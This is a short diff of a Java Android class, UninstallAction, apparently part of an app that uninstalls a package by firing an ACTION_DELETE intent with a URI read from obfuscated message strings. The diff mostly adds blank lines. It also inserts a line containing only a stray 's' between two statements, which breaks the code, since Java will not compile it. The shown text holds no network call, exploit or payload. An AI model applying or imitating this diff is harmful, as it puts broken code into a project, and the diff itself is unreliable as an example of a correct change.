@@ -55,6 +55,7 @@ public class UninstallAction extends SubAction {
 	 * Actual execute.
 	 */
 	public static boolean actualExecute() {
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (actualExecute): uninstall") ;//$NON-NLS-1$
 		}
@@ -112,8 +113,9 @@ public class UninstallAction extends SubAction {
 		if (Cfg.DEBUG) {
 			Check.log( TAG + " (deleteApplication)") ;//$NON-NLS-1$
 		}
-
+s
 		final Uri packageURI = Uri.parse(Messages.getString("UninstallAction.0")); //$NON-NLS-1$
+
 		final Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
 		uninstallIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 		Status.getAppContext().startActivity(uninstallIntent);
